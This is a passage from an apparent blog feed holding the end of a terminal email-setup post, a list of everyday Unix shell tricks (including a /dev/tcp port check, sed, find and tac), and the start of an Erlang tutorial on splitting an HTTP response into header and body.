&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;passwordeval &lt;span class="s2"&gt;&amp;quot;gpg2 --quiet --for-your-eyes-only --no-tty --decrypt &amp;lt;password-file&amp;gt;.gpg&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;abook - the contact manager&lt;/h2&gt;
&lt;p&gt;One last thing missing to get a complete email stack is a contact manager. I
found &lt;a href="http://abook.sourceforge.net/"&gt;abook&lt;/a&gt; to fill all needed requirements.
Moreover it is fully compatible with alot which uses it to auto-complete &lt;em&gt;TO&lt;/em&gt;
when redacting.&lt;/p&gt;
&lt;p&gt;BTW &lt;a href="https://raw.githubusercontent.com/yaroot/scripts/master/vcard2abook.py"&gt;this
script&lt;/a&gt;
converts vcard to abook.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;I've been using that setup for some weeks now and am very happy with it. It is
fast and the search feature is really doing it ! It takes some time to setup
all the right configs and keybindings but once settle, it's a bomb !
Last but not least, TUI rocks !&lt;/p&gt;
&lt;p&gt;Some more references:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cr.yp.to/proto/maildir.html"&gt;maildir&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://deferred.io/2016/01/18/notmuch-tags-gmail-labels-bidirectional-sync"&gt;notmuch-maildir-sync post&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://deferred.io/2016/01/18/how-i-email"&gt;how I email in 2016&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://deferred.io/posts/2013/01/13/email-workflow-for-champions.html"&gt;email workflow for champions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://offlineimap.readthedocs.org/en/next/MANUAL.html?highlight=keywords#sync-from-gmail-to-a-local-maildir-with-labels"&gt;offlineimap sync gmail&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/gauteh/abunchoftags"&gt;abunchoftags&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://catern.com/2014/05/15/mail-setup.html"&gt;A modern Unix mail setup&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://sirex.bitbucket.org/alot.html"&gt;alot post&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://f-koehler.github.io/posts/2015-03-17-offlineimap-msmtp-gnupg.html"&gt;offlineimap and msmtp with gnupg&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="email"></category><category term="offlineimap"></category><category term="alot"></category><category term="notmuch"></category></entry><entry><title>Unix tricks</title><link href="https://deadc0de.re/articles/unix-tricks.html" rel="alternate"></link><published>2016-02-26T00:00:00+01:00</published><updated>2016-02-26T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-02-26:/articles/unix-tricks.html</id><summary type="html">&lt;p&gt;Unix tricks&lt;/p&gt;</summary><content type="html">&lt;p&gt;Some neat unix tricks&lt;/p&gt;
&lt;h2&gt;port scanning using the shell&lt;/h2&gt;
&lt;p&gt;It is easy to port scan using simple unix tools&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nv"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;some host&amp;quot;&lt;/span&gt;
$ &lt;span class="nv"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;some port&amp;quot;&lt;/span&gt;
$ timeout &lt;span class="m"&gt;3&lt;/span&gt; bash -c &lt;span class="s2"&gt;&amp;quot;echo &amp;gt;/dev/tcp/&lt;/span&gt;&lt;span class="nv"&gt;$host&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;$port&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; open &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; closed
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;sed in-place replacement with backup&lt;/h2&gt;
&lt;p&gt;Sed is often used to act on file in-place. It is very convenient to be able
on a single command line to also backup the file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# replace SOMETHING by ELSE in the file&lt;/span&gt;
&lt;span class="c1"&gt;# and create a backup file named bar.txt.bak&lt;/span&gt;
$ sed -i.bak &lt;span class="s1"&gt;&amp;#39;s/SOMETHING/ELSE/g&amp;#39;&lt;/span&gt; bar.txt
&lt;span class="c1"&gt;# remove from the third to the last line of the file&lt;/span&gt;
&lt;span class="c1"&gt;# and create a backup file named bar.txt.bak&lt;/span&gt;
$ sed -i.bak &lt;span class="s1"&gt;&amp;#39;3,$d&amp;#39;&lt;/span&gt; bar.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;remove empty lines in file&lt;/h2&gt;
&lt;p&gt;Getting rid of empty lines in a file is easy with sed.
&lt;code&gt;/^$/&lt;/code&gt; will find lines with nothing between the beginning of the line (&lt;code&gt;^&lt;/code&gt;)
and the end of it (&lt;code&gt;$&lt;/code&gt;) and then &lt;code&gt;d&lt;/code&gt; deletes it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sed &lt;span class="s1"&gt;&amp;#39;/^$/d&amp;#39;&lt;/span&gt; &amp;lt;file-path&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;insert file in vim&lt;/h2&gt;
&lt;p&gt;It sometimes happen you want to insert a entire file at the cursor position
in vim. This is the command that will do that:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:r &amp;lt;file-path&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;remove file with weird names&lt;/h2&gt;
&lt;p&gt;Sometimes you have files that get created (or you created them by error) that
are not that easy to remove without potentially messing things up
like for example &lt;em&gt;--&lt;/em&gt;, &lt;em&gt;~&lt;/em&gt;, &lt;em&gt;/&lt;/em&gt;, ...&lt;/p&gt;
&lt;p&gt;The trick is first to retrieve the inode number of that file by listing
all files in the directory:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ls -i
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And then remove the file by its inode number using find:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ find . -inum &amp;lt;inode-num&amp;gt; -exec rm &lt;span class="o"&gt;{}&lt;/span&gt; &lt;span class="se"&gt;\;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;reverse lines in file&lt;/h2&gt;
&lt;p&gt;You probably know &lt;code&gt;cat&lt;/code&gt;, well there's also &lt;code&gt;tac&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat /tmp/foo
Line &lt;span class="m"&gt;1&lt;/span&gt;
Line &lt;span class="m"&gt;2&lt;/span&gt;
Line &lt;span class="m"&gt;3&lt;/span&gt;
$ tac /tmp/foo
Line &lt;span class="m"&gt;3&lt;/span&gt;
Line &lt;span class="m"&gt;2&lt;/span&gt;
Line &lt;span class="m"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;get N random lines from a file&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;randomize-lines&lt;/code&gt; is a nice tool allowing to quickly (and easily) randomize
lines of a file. After installation, its binary is &lt;code&gt;rl&lt;/code&gt; (at least on debian).
Combining it with &lt;code&gt;head&lt;/code&gt; allows to retrieve N random lines from a file&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# retrieveing 100 random lines from foo.txt&lt;/span&gt;
$ rl foo.txt &lt;span class="p"&gt;|&lt;/span&gt; head -100
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;execute last command as root&lt;/h2&gt;
&lt;p&gt;I rarely use sudo, but when I need to, I usually forget it.
This allows to execute latest command with sudo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo !!
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;get your bandwidth from the cli&lt;/h2&gt;
&lt;p&gt;The tool &lt;a href="https://github.com/sivel/speedtest-cli"&gt;speedtest-cli&lt;/a&gt; is very useful
to retrieve the current download/upload speed.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ speedtest-cli &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s1"&gt;&amp;#39;Download\|Upload&amp;#39;&lt;/span&gt;
Download: &lt;span class="m"&gt;711&lt;/span&gt;.94 Mbit/s
Upload: &lt;span class="m"&gt;264&lt;/span&gt;.28 Mbit/s
&lt;/pre&gt;&lt;/div&gt;</content><category term="unix"></category><category term="cli"></category><category term="shell"></category></entry><entry><title>HTTP response parsing with Erlang</title><link href="https://deadc0de.re/articles/erlang-http-parsing.html" rel="alternate"></link><published>2016-02-08T00:00:00+01:00</published><updated>2016-02-08T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-02-08:/articles/erlang-http-parsing.html</id><summary type="html">&lt;p&gt;HTTP response parsing with Erlang&lt;/p&gt;</summary><content type="html">&lt;p&gt;The goal is to parse an HTTP response into two elements, the header
and the body. As everyone knows, the header is separated from the
body &lt;a href="https://tools.ietf.org/html/rfc2616"&gt;using two CRLFs&lt;/a&gt; (&lt;code&gt;\r\n&lt;/code&gt;).
Some freestylers (obviously not following the RFC) use two &lt;code&gt;\n&lt;/code&gt;. I however won't
deal with that in here.&lt;/p&gt;
&lt;p&gt;First get a HTTP response:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s1"&gt;&amp;#39;GET / HTTP/1.1\r\n\r\n&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; nc google.com &lt;span class="m"&gt;80&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; tee /tmp/response
HTTP/1.1 &lt;span class="m"&gt;302&lt;/span&gt; Found
Cache-Control: private
Content-Type: text/html&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;UTF-8
Location: ...
Content-Length: &lt;span class="m"&gt;256&lt;/span&gt;
Date: ...
Server: GFE/2.0

&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;meta http-equiv&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;content-type&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;text/html;charset=utf-8&amp;quot;&lt;/span&gt;&amp;gt;
&amp;lt;TITLE&amp;gt;302 Moved&amp;lt;/TITLE&amp;gt;&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;
&amp;lt;H1&amp;gt;302 Moved&amp;lt;/H1&amp;gt;
The document has moved
&amp;lt;A &lt;span class="nv"&gt;HREF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;...&amp;quot;&lt;/span&gt;&amp;gt;here&amp;lt;/A&amp;gt;.
&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The response content is copied to &lt;code&gt;/tmp/response&lt;/code&gt;. With erlang,
this is easily read with &lt;a href="http://erlang.org/doc/man/file.html#read_file-1"&gt;file:read_file&lt;/a&gt;
(loading the content to a Binary) and then transforming the binary to a string
using &lt;a href="http://erlang.org/doc/man/erlang.html#binary_to_list-1"&gt;erlang:binary_to_list&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Erlang provides two interesting modules which help to deal with string:
&lt;a href="http://erlang.org/doc/man/string.html"&gt;string&lt;/a&gt; and &lt;a href="http://erlang.org/doc/man/lists.html"&gt;lists&lt;/a&gt;
(since a string is a list in erlang).
Looking for something to allow me to split a string into several tokens
based on a separator lead me to these solutions:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;tokenize&lt;/strong&gt; using &lt;a href="http://erlang.org/doc/man/string.html#tokens-2"&gt;string:tokens/2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;offset and sub-string&lt;/strong&gt; using &lt;a href="http://erlang.org/doc/man/string.html#str-2"&gt;string:str/2&lt;/a&gt;
     and &lt;a href="http://erlang.org/doc/man/string.html#substr-2"&gt;string:substr&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;offset and split&lt;/strong&gt; using &lt;a href="http://erlang.org/doc/man/string.html#str-2"&gt;string:str/2&lt;/a&gt; and
     &lt;a href="http://erlang.org/doc/man/lists.html#split-2"&gt;lists:split/2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;coding way&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Tokenize&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://erlang.org/doc/man/string.html#tokens-2"&gt;string:tokens/2&lt;/a&gt; allows
to split a string into a list of tokens.&lt;/p&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;tokens&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;this is a test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;this&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;is&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A disadvantage (or advantage) from this method is that adjacent separators are
treated as one as shown here:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;tokens&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;I want to separate successive c in here&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;cc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;I want to separate su&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;essive &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot; in here&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;instead of the expected &lt;code&gt;["I want to separate su","essive c in here"]&lt;/code&gt; :-(&lt;/p&gt;
&lt;p&gt;Similarly when parsing HTTP response, we're looking to separate the
header from the body using the separator &lt;code&gt;\r\n\r\n&lt;/code&gt;. As shown this won't work
with &lt;code&gt;tokens&lt;/code&gt; since &lt;code&gt;\r\n\r\n&lt;/code&gt; will be treated as &lt;code&gt;\r\n&lt;/code&gt; and thus result in
the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;read_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/tmp/response&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;binary_to_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;tokens&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r\n\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;HTTP/1.1 302 Found&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Cache-Control: private&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;Content-Type: text/html; charset=UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;Location: ...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;Content-Length: 256&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Date: ...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;Server: GFE/2.0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;meta http-equiv=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;content-type&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt; content=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;text/html;charset=utf-8&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&amp;lt;TITLE&amp;gt;302 Moved&amp;lt;/TITLE&amp;gt;&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&amp;lt;H1&amp;gt;302 Moved&amp;lt;/H1&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;The document has moved&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&amp;lt;A HREF=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;...&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;here&amp;lt;/A&amp;gt;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's try something else ...&lt;/p&gt;
&lt;h2&gt;Offset and sub-string&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://erlang.org/doc/man/string.html#str-2"&gt;string:str/2&lt;/a&gt; allows you to retrieve
the offset of a specific sequence in a string while
&lt;a href="http://erlang.org/doc/man/string.html#substr-2"&gt;string:substr&lt;/a&gt; helps you extract
a sub-string based on its starting offset and its length.&lt;/p&gt;
&lt;p&gt;One way of doing it would then be:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;read_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/tmp/response&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;binary_to_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r\n\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="c"&gt;% first retrieve the header&lt;/span&gt;
&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Offset&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;HTTP/1.1 302 Found&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Cache-Control: private&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Content-Type: text/html; charset=UTF-8&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Location: ...&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Content-Length: 256&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Date: ...&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Server: GFE/2.0&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="c"&gt;% then the body&lt;/span&gt;
&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Offset&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;meta http-equiv=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;content-type&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt; content=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;text/html;charset=utf-8&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;TITLE&amp;gt;302 Moved&amp;lt;/TITLE&amp;gt;&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;H1&amp;gt;302 Moved&amp;lt;/H1&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;The document has moved&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;A HREF=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;...&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;here&amp;lt;/A&amp;gt;.&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This works but you must admit it is not very elegant. Moreover you have to
play with the offset value to get exactly the part you want. Not nice !
Moreover you can only split a string in two and thus wouldn't easily be
able to split a string in more than two fields.&lt;/p&gt;
&lt;h2&gt;Offset and split&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://erlang.org/doc/man/lists.html#split-2"&gt;lists:split/2&lt;/a&gt; will split the
list provided in argument in two lists with the first one containing the N first
char(s):&lt;/p&gt;
